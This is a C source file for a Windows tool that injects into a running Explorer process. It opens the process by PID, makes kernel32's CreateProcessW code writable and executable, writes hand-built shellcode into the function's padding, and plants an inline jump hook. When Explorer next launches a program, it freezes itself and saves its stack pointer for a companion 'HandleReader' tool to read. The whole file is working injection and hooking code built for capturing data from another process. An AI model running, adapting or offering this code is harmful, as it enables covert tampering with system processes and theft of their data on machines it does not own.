#include "Decode.h"

#include <Psapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI NtSuspendProcess(_In_ HANDLE hProcess);
EXTERN_C NTSTATUS NTAPI NtResumeProcess(_In_ HANDLE hProcess);

#define MAX_FUNC_SIZE       0x180
#define SHELLCODE_SIZE      0x12
#define RSP_SLOT_SIZE       0x08
#define INLINE_HOOK_SIZE    0x05
#define PROLOGUE_FRAME_SIZE 0x58
#define DEFAULT_TIMEOUT_SEC 120

typedef struct _LAYOUT {
    LPCBYTE lpFunction;
    DWORD dwFuncSize;
    LPCBYTE lpInternalCall;
    BYTE bCallLength;
    LPCBYTE lpHookSite;
    LPCBYTE lpShellcodeSite;
    LPCBYTE lpRspSlot;
} LAYOUT;

static BOOL VerifyPrologue(
    _In_ LPCBYTE lpFunction,
    _Out_ DWORD* pdwPrologueSize
) {
    *pdwPrologueSize = 0;

    ZydisDisassembledInstruction mov = { 0 };
    ZyanStatus status = DisassembleInstruction(lpFunction, &mov);
    if (!ZYAN_SUCCESS(status)) {
        fprintf(stderr, "[-] Prologue MOV decode failed: 0x%08X\n", (unsigned) status);
        return FALSE;
    }

    if (
        ZYDIS_MNEMONIC_MOV != mov.info.mnemonic ||
        2 != mov.info.operand_count_visible ||
        ZYDIS_OPERAND_TYPE_REGISTER != mov.operands[0].type ||
        ZYDIS_OPERAND_TYPE_REGISTER != mov.operands[1].type ||
        ZYDIS_REGISTER_R11 != mov.operands[0].reg.value ||
        ZYDIS_REGISTER_RSP != mov.operands[1].reg.value
    ) {
        fprintf(stderr, "[-] First instruction is not MOV r11, rsp\n");
        return FALSE;
    }

    ZydisDisassembledInstruction sub = { 0 };
    status = DisassembleInstruction(lpFunction + mov.info.length, &sub);
    if (!ZYAN_SUCCESS(status)) {
        fprintf(stderr, "[-] Prologue SUB decode failed: 0x%08X\n", (unsigned) status);
        return FALSE;
    }

    if (
        ZYDIS_MNEMONIC_SUB != sub.info.mnemonic ||
        3 != sub.info.operand_count ||
        ZYDIS_OPERAND_TYPE_REGISTER != sub.operands[0].type ||
        ZYDIS_REGISTER_RSP != sub.operands[0].reg.value ||
        ZYDIS_OPERAND_TYPE_IMMEDIATE != sub.operands[1].type ||
        PROLOGUE_FRAME_SIZE != sub.operands[1].imm.value.u
    ) {
        fprintf(stderr, "[-] Second instruction is not SUB rsp, 0x58\n");
        return FALSE;
    }

    *pdwPrologueSize = mov.info.length + sub.info.length;
    return TRUE;
}

static BOOL FindInternalCall(
    _In_ LPCBYTE lpFunction,
    _In_ DWORD dwFuncSize,
    _Out_ LPCBYTE* lppCall,
    _Out_ BYTE* pbCallLength
) {
    *lppCall = NULL;
    *pbCallLength = 0;

    DWORD dwOffset = 0;
    while (dwOffset < dwFuncSize) {
        ZydisDisassembledInstruction decoded = { 0 };
        ZyanStatus status = DisassembleInstruction(lpFunction + dwOffset, &decoded);
        if (!ZYAN_SUCCESS(status)) {
            fprintf(stderr, "[-] Decode failed at function offset 0x%X: 0x%08X\n", dwOffset, (unsigned) status);
            return FALSE;
        }

        if (ZYDIS_MNEMONIC_CALL == decoded.info.mnemonic) {
            *lppCall = lpFunction + dwOffset;
            *pbCallLength = decoded.info.length;
            return TRUE;
        }

        dwOffset += decoded.info.length;
    }

    fprintf(stderr, "[-] No internal CALL found within the function\n");
    return FALSE;
}

static BOOL CheckInt3Padding(
    _In_reads_bytes_(cbSize) LPCBYTE lpRegion,
    _In_ SIZE_T cbSize
) {
    for (SIZE_T i = 0; i < cbSize; i++) {
        if (0xCC != lpRegion[i]) {
            return FALSE;
        }
    }
    return TRUE;
}

static BOOL FitsRel8(
    _In_ INT64 nDisplacement
) {
    return nDisplacement >= -128 && nDisplacement <= 127;
}

static BOOL FitsRel32(
    _In_ INT64 nDisplacement
) {
    return nDisplacement >= INT32_MIN && nDisplacement <= INT32_MAX;
}

static BOOL AssessLayout(
    _In_ LPCBYTE lpFunction,
    _Out_ LAYOUT* pLayout
) {
    ZeroMemory(pLayout, sizeof(*pLayout));
    pLayout->lpFunction = lpFunction;

    DWORD dwPrologueSize = 0;
    if (!VerifyPrologue(lpFunction, &dwPrologueSize)) {
        return FALSE;
    }
    printf("[+] Prologue: MOV r11, rsp; SUB rsp, 0x58 (%lu bytes)\n", dwPrologueSize);

    DWORD dwFuncSize = (DWORD) GetFunctionSize(lpFunction, MAX_FUNC_SIZE);
    if (0 == dwFuncSize) {
        fprintf(stderr, "[-] No RET within the 0x%X byte function bound\n", MAX_FUNC_SIZE);
        return FALSE;
    }
    pLayout->dwFuncSize = dwFuncSize;
    printf("[+] Function size to first RET: 0x%X\n", dwFuncSize);

    if (!FindInternalCall(lpFunction, dwFuncSize, &pLayout->lpInternalCall, &pLayout->bCallLength)) {
        return FALSE;
    }
    printf(
        "[+] Internal CALL at +0x%zX, %u bytes (%s)\n",
        (SIZE_T) (pLayout->lpInternalCall - lpFunction),
        pLayout->bCallLength,
        0xE8 == pLayout->lpInternalCall[0] ? "direct rel32" : "indirect"
    );

    pLayout->lpHookSite = pLayout->lpInternalCall + pLayout->bCallLength;
    ZydisDisassembledInstruction hookCandidate = { 0 };
    ZyanStatus status = DisassembleInstruction(pLayout->lpHookSite, &hookCandidate);
    if (
        !ZYAN_SUCCESS(status) ||
        ZYDIS_MNEMONIC_NOP != hookCandidate.info.mnemonic ||
        INLINE_HOOK_SIZE != hookCandidate.info.length
    ) {
        fprintf(stderr, "[-] Expected a 5-byte NOP after the internal CALL\n");
        return FALSE;
    }
    printf(
        "[+] Hook site: +0x%zX, 5-byte NOP %02X %02X %02X %02X %02X\n",
        (SIZE_T) (pLayout->lpHookSite - lpFunction),
        pLayout->lpHookSite[0], pLayout->lpHookSite[1], pLayout->lpHookSite[2],
        pLayout->lpHookSite[3], pLayout->lpHookSite[4]
    );

    pLayout->lpRspSlot = lpFunction - RSP_SLOT_SIZE;
    if (!CheckInt3Padding(pLayout->lpRspSlot, RSP_SLOT_SIZE)) {
        fprintf(stderr, "[-] The 8 bytes before the function are not INT3 padding\n");
        return FALSE;
    }
    printf("[+] RSP save slot: function-0x8, INT3 padding intact\n");

    pLayout->lpShellcodeSite = lpFunction + dwFuncSize;
    if (dwFuncSize + SHELLCODE_SIZE > MAX_FUNC_SIZE) {
        fprintf(stderr, "[-] Shellcode would exceed the 0x%X byte patch bound\n", MAX_FUNC_SIZE);
        return FALSE;
    }
    if (!CheckInt3Padding(pLayout->lpShellcodeSite, SHELLCODE_SIZE)) {
        fprintf(stderr, "[-] The 18 bytes after the function are not INT3 padding\n");
        return FALSE;
    }
    printf("[+] Shellcode site: function+0x%X, 18 bytes of INT3 padding intact\n", dwFuncSize);

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (NULL == hNtdll) {
        fprintf(stderr, "[-] GetModuleHandleW(ntdll): E%lu\n", GetLastError());
        return FALSE;
    }
    FARPROC fpNtSuspendProcess = GetProcAddress(hNtdll, "NtSuspendProcess");
    if (NULL == fpNtSuspendProcess) {
        fprintf(stderr, "[-] GetProcAddress(NtSuspendProcess): E%lu\n", GetLastError());
        return FALSE;
    }

    INT64 nCallDisp = (INT64) fpNtSuspendProcess - (INT64) (pLayout->lpShellcodeSite + SHELLCODE_SIZE - 2);
    if (!FitsRel32(nCallDisp)) {
        fprintf(stderr, "[-] NtSuspendProcess is outside rel32 reach of the shellcode CALL\n");
        return FALSE;
    }
    printf("[+] NtSuspendProcess rel32 displacement: 0x%llX (fits)\n", (unsigned long long) nCallDisp);

    INT64 nHookDisp = (INT64) pLayout->lpShellcodeSite - (INT64) (pLayout->lpHookSite + 2);
    INT64 nTrampolineDisp = (INT64) (pLayout->lpHookSite + INLINE_HOOK_SIZE) - (INT64) (pLayout->lpShellcodeSite + SHELLCODE_SIZE);
    if (!FitsRel8(nHookDisp) || !FitsRel8(nTrampolineDisp)) {
        fprintf(stderr, "[-] Hook or trampoline displacement does not fit rel8\n");
        return FALSE;
    }
    printf(
        "[+] Hook rel8: 0x%02X, trampoline rel8: 0x%02X (both fit)\n",
        (unsigned) (BYTE) nHookDisp,
        (unsigned) (BYTE) nTrampolineDisp
    );

    return TRUE;
}

static UINT_PTR GetRemoteModuleBase(
    _In_ HANDLE hProcess,
    _In_ LPCWSTR wszModuleName
) {
    HMODULE ahModules[1024] = { 0 };
    DWORD cbNeeded = 0;

    if (!K32EnumProcessModules(hProcess, ahModules, sizeof(ahModules), &cbNeeded)) {
        fprintf(stderr, "[-] K32EnumProcessModules: E%lu\n", GetLastError());
        return 0;
    }

    for (DWORD i = 0; i < cbNeeded / sizeof(HMODULE); i++) {
        WCHAR wszName[MAX_PATH] = { 0 };
        if (0 == K32GetModuleBaseNameW(hProcess, ahModules[i], wszName, MAX_PATH)) {
            continue;
        }
        if (0 == _wcsicmp(wszName, wszModuleName)) {
            return (UINT_PTR) ahModules[i];
        }
    }

    fprintf(stderr, "[-] Module %ls not found in the target process\n", wszModuleName);
    return 0;
}

static BOOL ReadRemote(
    _In_ HANDLE hProcess,
    _In_ UINT_PTR qwAddress,
    _Out_writes_bytes_(cbSize) LPVOID lpBuffer,
    _In_ SIZE_T cbSize
) {
    SIZE_T cbRead = 0;
    if (!ReadProcessMemory(hProcess, (LPCVOID) qwAddress, lpBuffer, cbSize, &cbRead) || cbRead != cbSize) {
        fprintf(stderr, "[-] ReadProcessMemory at 0x%llX: E%lu\n", (unsigned long long) qwAddress, GetLastError());
        return FALSE;
    }
    return TRUE;
}

static BOOL WriteRemoteVerified(
    _In_ HANDLE hProcess,
    _In_ UINT_PTR qwAddress,
    _In_reads_bytes_(cbSize) LPCVOID lpBuffer,
    _In_ SIZE_T cbSize
) {
    SIZE_T cbWritten = 0;
    if (!WriteProcessMemory(hProcess, (LPVOID) qwAddress, lpBuffer, cbSize, &cbWritten) || cbWritten != cbSize) {
        fprintf(stderr, "[-] WriteProcessMemory at 0x%llX: E%lu\n", (unsigned long long) qwAddress, GetLastError());
        return FALSE;
    }

    BYTE abReadBack[64] = { 0 };
    if (cbSize > sizeof(abReadBack)) {
        fprintf(stderr, "[-] Write too large for read-back verification\n");
        return FALSE;
    }
    if (!ReadRemote(hProcess, qwAddress, abReadBack, cbSize)) {
        return FALSE;
    }
    if (0 != memcmp(abReadBack, lpBuffer, cbSize)) {
        fprintf(stderr, "[-] Read-back mismatch at 0x%llX\n", (unsigned long long) qwAddress);
        return FALSE;
    }
    return TRUE;
}

static BOOL WaitForEnter(
    _In_ DWORD dwTimeoutSec
) {
    HANDLE hConsole = GetStdHandle(STD_INPUT_HANDLE);
    ULONGLONG qwStart = GetTickCount64();

    for (;;) {
        INPUT_RECORD record = { 0 };
        DWORD dwRead = 0;

        while (PeekConsoleInputW(hConsole, &record, 1, &dwRead) && dwRead > 0) {
            if (!ReadConsoleInputW(hConsole, &record, 1, &dwRead)) {
                fprintf(stderr, "[-] ReadConsoleInputW: E%lu\n", GetLastError());
                return FALSE;
            }
            if (
                KEY_EVENT == record.EventType &&
                record.Event.KeyEvent.bKeyDown &&
                VK_RETURN == record.Event.KeyEvent.wVirtualKeyCode
            ) {
                return TRUE;
            }
        }

        if (GetTickCount64() - qwStart >= (ULONGLONG) dwTimeoutSec * 1000) {
            fprintf(stderr, "[-] Timed out after %lu seconds waiting for ENTER\n", dwTimeoutSec);
            return FALSE;
        }
        Sleep(50);
    }
}

static INT AssessMain(void) {
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (NULL == hKernel32) {
        fprintf(stderr, "[-] GetModuleHandleW(kernel32): E%lu\n", GetLastError());
        return EXIT_FAILURE;
    }

    FARPROC fpCreateProcessW = GetProcAddress(hKernel32, "CreateProcessW");
    if (NULL == fpCreateProcessW) {
        fprintf(stderr, "[-] GetProcAddress(CreateProcessW): E%lu\n", GetLastError());
        return EXIT_FAILURE;
    }

    printf("[+] kernel32!CreateProcessW: 0x%p (read-only assessment)\n", (LPCVOID) fpCreateProcessW);

    LAYOUT layout = { 0 };
    if (!AssessLayout((LPCBYTE) fpCreateProcessW, &layout)) {
        printf("[-] ASSESSMENT: layout is NOT compatible with the capture mechanism\n");
        return EXIT_FAILURE;
    }

    printf("[+] ASSESSMENT: layout compatible; no process was opened or modified\n");
    return EXIT_SUCCESS;
}

static INT CaptureMain(
    _In_ DWORD dwExplorerPid,
    _In_ DWORD dwTimeoutSec
) {
    INT iRet = EXIT_FAILURE;
    HANDLE hExplorer = NULL;
    BOOL bProtectionChanged = FALSE;
    BOOL bHookWritten = FALSE;
    BOOL bShellcodeWritten = FALSE;
    DWORD dwOldProtect = 0;
    UINT_PTR qwRemoteFunction = 0;
    UINT_PTR qwRemoteHook = 0;
    UINT_PTR qwRemoteShellcode = 0;
    UINT_PTR qwRemoteRspSlot = 0;
    BYTE abOriginalHook[INLINE_HOOK_SIZE] = { 0 };
    BYTE abOriginalPadding[SHELLCODE_SIZE] = { 0 };

    LAYOUT layout = { 0 };
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (NULL == hKernel32) {
        fprintf(stderr, "[-] GetModuleHandleW(kernel32): E%lu\n", GetLastError());
        return EXIT_FAILURE;
    }
    FARPROC fpCreateProcessW = GetProcAddress(hKernel32, "CreateProcessW");
    if (NULL == fpCreateProcessW) {
        fprintf(stderr, "[-] GetProcAddress(CreateProcessW): E%lu\n", GetLastError());
        return EXIT_FAILURE;
    }
    if (!AssessLayout((LPCBYTE) fpCreateProcessW, &layout)) {
        fprintf(stderr, "[-] Local layout assessment failed; refusing to capture\n");
        return EXIT_FAILURE;
    }

    hExplorer = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_SUSPEND_RESUME |
        PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
        FALSE,
        dwExplorerPid
    );
    if (NULL == hExplorer) {
        fprintf(stderr, "[-] OpenProcess(%lu): E%lu\n", dwExplorerPid, GetLastError());
        return EXIT_FAILURE;
    }

    UINT_PTR qwRemoteKernel32 = GetRemoteModuleBase(hExplorer, L"kernel32.dll");
    UINT_PTR qwRemoteNtdll = GetRemoteModuleBase(hExplorer, L"ntdll.dll");
    if (0 == qwRemoteKernel32 || 0 == qwRemoteNtdll) {
        goto _FINAL;
    }

    qwRemoteFunction = qwRemoteKernel32 + ((UINT_PTR) layout.lpFunction - (UINT_PTR) hKernel32);
    qwRemoteHook = qwRemoteKernel32 + ((UINT_PTR) layout.lpHookSite - (UINT_PTR) hKernel32);
    qwRemoteShellcode = qwRemoteFunction + layout.dwFuncSize;
    qwRemoteRspSlot = qwRemoteFunction - RSP_SLOT_SIZE;

    UINT_PTR qwLocalNtdll = (UINT_PTR) GetModuleHandleW(L"ntdll.dll");
    UINT_PTR qwLocalNtSuspend = (UINT_PTR) GetProcAddress((HMODULE) qwLocalNtdll, "NtSuspendProcess");
    if (0 == qwLocalNtdll || 0 == qwLocalNtSuspend) {
        fprintf(stderr, "[-] Unable to resolve local NtSuspendProcess: E%lu\n", GetLastError());
        goto _FINAL;
    }
    UINT_PTR qwRemoteNtSuspend = qwRemoteNtdll + (qwLocalNtSuspend - qwLocalNtdll);

    if (!ReadRemote(hExplorer, qwRemoteHook, abOriginalHook, sizeof(abOriginalHook))) {
        goto _FINAL;
    }
    CONST BYTE abExpectedNop[INLINE_HOOK_SIZE] = { 0x0F, 0x1F, 0x44, 0x00, 0x00 };
    if (0 != memcmp(abOriginalHook, abExpectedNop, sizeof(abExpectedNop))) {
        fprintf(stderr, "[-] Remote hook site is not the expected 5-byte NOP; layout differs\n");
        goto _FINAL;
    }
    if (!ReadRemote(hExplorer, qwRemoteShellcode, abOriginalPadding, sizeof(abOriginalPadding))) {
        goto _FINAL;
    }
    if (!CheckInt3Padding(abOriginalPadding, sizeof(abOriginalPadding))) {
        fprintf(stderr, "[-] Remote shellcode region is not INT3 padding\n");
        goto _FINAL;
    }
    BYTE abRemoteSlot[RSP_SLOT_SIZE] = { 0 };
    if (!ReadRemote(hExplorer, qwRemoteRspSlot, abRemoteSlot, sizeof(abRemoteSlot))) {
        goto _FINAL;
    }
    if (!CheckInt3Padding(abRemoteSlot, sizeof(abRemoteSlot))) {
        fprintf(stderr, "[-] Remote RSP slot is not INT3 padding\n");
        goto _FINAL;
    }

    printf(
        "[+] Explorer PID............................. %lu\n"
        "[+] Remote CreateProcessW.................... 0x%llX\n"
        "[+] Remote hook site......................... 0x%llX\n"
        "[+] Remote shellcode site.................... 0x%llX\n"
        "[+] Remote RSP save slot..................... 0x%llX\n"
        "[+] Remote NtSuspendProcess.................. 0x%llX\n",
        dwExplorerPid,
        (unsigned long long) qwRemoteFunction,
        (unsigned long long) qwRemoteHook,
        (unsigned long long) qwRemoteShellcode,
        (unsigned long long) qwRemoteRspSlot,
        (unsigned long long) qwRemoteNtSuspend
    );

    BYTE abShellcode[SHELLCODE_SIZE] = {
        0x48, 0x89, 0x25, 0x00, 0x00, 0x00, 0x00,
        0x6A, 0xFF,
        0x59,
        0xE8, 0x00, 0x00, 0x00, 0x00,
        0xEB, 0x00
    };

    INT64 nSaveDisp = (INT64) qwRemoteRspSlot - (INT64) (qwRemoteShellcode + 7);
    INT64 nCallDisp = (INT64) qwRemoteNtSuspend - (INT64) (qwRemoteShellcode + 15);
    INT64 nTrampolineDisp = (INT64) (qwRemoteHook + INLINE_HOOK_SIZE) - (INT64) (qwRemoteShellcode + SHELLCODE_SIZE);
    INT64 nHookDisp = (INT64) qwRemoteShellcode - (INT64) (qwRemoteHook + 2);
    if (!FitsRel32(nSaveDisp) || !FitsRel32(nCallDisp) || !FitsRel8(nTrampolineDisp) || !FitsRel8(nHookDisp)) {
        fprintf(stderr, "[-] Remote displacement out of range; refusing to patch\n");
        goto _FINAL;
    }
    *(DWORD*) &abShellcode[3] = (DWORD) (INT32) nSaveDisp;
    *(DWORD*) &abShellcode[11] = (DWORD) (INT32) nCallDisp;
    abShellcode[17] = (BYTE) nTrampolineDisp;

    BYTE abInlineHook[INLINE_HOOK_SIZE] = { 0xEB, (BYTE) nHookDisp, 0x0F, 0x1F, 0xC0 };

    if (!VirtualProtectEx(
        hExplorer,
        (LPVOID) qwRemoteRspSlot,
        MAX_FUNC_SIZE + RSP_SLOT_SIZE,
        PAGE_EXECUTE_READWRITE,
        &dwOldProtect
    )) {
        fprintf(stderr, "[-] VirtualProtectEx: E%lu\n", GetLastError());
        goto _FINAL;
    }
    bProtectionChanged = TRUE;

    if (!WriteRemoteVerified(hExplorer, qwRemoteShellcode, abShellcode, sizeof(abShellcode))) {
        goto _FINAL;
    }
    bShellcodeWritten = TRUE;

    if (!WriteRemoteVerified(hExplorer, qwRemoteHook, abInlineHook, sizeof(abInlineHook))) {
        goto _FINAL;
    }
    bHookWritten = TRUE;

    // Protection stays RWX until cleanup: the shellcode writes the RSP slot
    // (same page as the code) when the hook fires, not when it is installed.
    printf("[+] Hook and shellcode written and read back\n");
    printf("[+] Launch a program through Explorer, then press ENTER here (timeout %lu s)\n", dwTimeoutSec);

    BOOL bEnter = WaitForEnter(dwTimeoutSec);
    if (!bEnter) {
        fprintf(stderr, "[-] No confirmation received; restoring and resuming\n");
    }

    iRet = bEnter ? EXIT_SUCCESS : EXIT_FAILURE;

_FINAL:
    if (bHookWritten) {
        if (!WriteRemoteVerified(hExplorer, qwRemoteHook, abOriginalHook, sizeof(abOriginalHook))) {
            fprintf(stderr, "[-] Hook restoration FAILED; Explorer may still be hooked\n");
            iRet = EXIT_FAILURE;
        }
    }
    if (bShellcodeWritten) {
        if (!WriteRemoteVerified(hExplorer, qwRemoteShellcode, abOriginalPadding, sizeof(abOriginalPadding))) {
            fprintf(stderr, "[-] Shellcode padding restoration FAILED\n");
            iRet = EXIT_FAILURE;
        }
    }
    if (bProtectionChanged) {
        if (!VirtualProtectEx(hExplorer, (LPVOID) qwRemoteRspSlot, MAX_FUNC_SIZE + RSP_SLOT_SIZE, dwOldProtect, &dwOldProtect)) {
            fprintf(stderr, "[-] Protection restoration FAILED: E%lu\n", GetLastError());
            iRet = EXIT_FAILURE;
        }
    }
    if (NULL != hExplorer) {
        if (bHookWritten) {
            NTSTATUS ntStatus = NtResumeProcess(hExplorer);
            printf("[+] NtResumeProcess: 0x%08lX\n", (unsigned long) ntStatus);
            if (!NT_SUCCESS(ntStatus)) {
                iRet = EXIT_FAILURE;
            }
            printf(
                "[+] Restored and resumed Explorer. RSP slot left for the reader:\n"
                "    HandleReader.exe %lu %llX\n",
                dwExplorerPid,
                (unsigned long long) qwRemoteRspSlot
            );
        }
        CloseHandle(hExplorer);
    }
    return iRet;
}

int wmain(int argc, wchar_t* argv[]) {
    if (2 == argc && 0 == wcscmp(argv[1], L"--assess")) {
        return AssessMain();
    }

    if (argc >= 2 && argv[1][0] != L'-') {
        DWORD dwPid = (DWORD) wcstoul(argv[1], NULL, 10);
        if (0 == dwPid) {
            fwprintf(stderr, L"[-] Invalid PID: %s\n", argv[1]);
            return EXIT_FAILURE;
        }

        DWORD dwTimeout = DEFAULT_TIMEOUT_SEC;
        if (argc >= 4 && 0 == wcscmp(argv[2], L"--timeout")) {
            dwTimeout = (DWORD) wcstoul(argv[3], NULL, 10);
            if (0 == dwTimeout) {
                fwprintf(stderr, L"[-] Invalid timeout: %s\n", argv[3]);
                return EXIT_FAILURE;
            }
        }
        return CaptureMain(dwPid, dwTimeout);
    }

    fwprintf(stderr, L"Usage: %s <EXPLORER_PID> [--timeout SECONDS] | --assess\n", argv[0]);
    return EXIT_FAILURE;
}